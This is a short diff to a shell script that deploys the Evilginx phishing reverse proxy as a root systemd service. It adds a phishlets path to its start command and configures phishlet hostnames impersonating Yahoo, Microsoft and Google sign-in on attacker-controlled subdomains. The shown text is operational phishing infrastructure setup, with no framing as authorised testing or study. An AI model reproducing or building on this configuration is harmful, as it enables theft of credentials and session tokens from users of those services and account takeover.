@@ -732,7 +732,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 
@@ -742,7 +742,7 @@ EOF
 
     # Configure phishlets
     sleep 2
-    /usr/local/bin/evilginx -c "$EVILGINX_DIR/config.yaml" << CMDS
+    /usr/local/bin/evilginx -c "$EVILGINX_DIR/config.yaml" -p "$EVILGINX_DIR/phishlets" << CMDS
 phishlets hostname yahoo $EP1.$DOMAIN
 phishlets hostname microsoft $EP2.$DOMAIN
 phishlets hostname google $EP3.$DOMAIN
